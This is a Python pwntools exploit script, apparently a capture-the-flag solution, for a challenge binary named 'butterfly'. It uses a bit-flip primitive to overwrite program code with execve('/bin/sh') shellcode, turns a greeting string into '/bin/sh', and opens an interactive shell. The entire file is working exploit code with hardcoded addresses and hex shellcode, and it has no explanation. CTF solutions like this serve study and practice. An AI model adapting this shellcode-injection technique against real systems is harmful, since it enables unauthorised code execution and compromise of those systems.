#!/usr/bin/env python2

from pwn import *

#r = remote('butterfly.pwning.xxx', 9999)
r = process('./butterfly')

loop_val = '0x20041c6'
# Start the loop
r.sendline(loop_val)

# Generate the payload
start_addr = 0x40084a
shell_addr = 0x400914
shellcode = '4831f648c7c03b0000004831d248c7c7140940000f05'
text      = '4531f664488b042528000000483b44244075264489f0'
shell = ''.join('{:02x}'.format(ord(c)) for c in list('/bin/sh\0'))
greeting = 'THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?'[0:8]
greeting = ''.join('{:02x}'.format(ord(c)) for c in greeting)

# We need to parse it bytes after bytes
chunks_sc = [shellcode[i:i+2] for i in range(0, len(shellcode), 2)]
chunks_tx = [text[i:i+2] for i in range(0, len(text), 2)]

# loop over each byte
for i in range(0,len(chunks_tx)):
    # compute the flips needed
    flips = list('{:08b}'.format(int(chunks_tx[i],16) ^ int(chunks_sc[i], 16)))
    flips.reverse()
    indices = []
    # store the offsets of the flips in a table
    for j in range(0,len(flips)):
        if (flips[j] == '1'):
            indices.append(j)
    # for each flip send a corresponding number
    for n in indices:
        r.sendline('0x{:x}'.format((start_addr + i) * 8 + n))

#Same for the greeting and shell
chunks_sh = [shell[i:i+2] for i in range(0, len(shell), 2)]
chunks_gr = [greeting[i:i+2] for i in range(0, len(greeting), 2)]

for i in range(0,len(chunks_gr)):
    flips = list('{:08b}'.format(int(chunks_gr[i],16) ^ int(chunks_sh[i], 16)))
    flips.reverse()
    indices = []
    for j in range(0,len(flips)):
        if (flips[j] == '1'):
            indices.append(j)
    for n in indices:
        r.sendline('0x{:x}'.format((shell_addr + i) * 8 + n))

# Reset the call to mprotect
r.sendline(loop_val)
r.clean()
r.interactive()
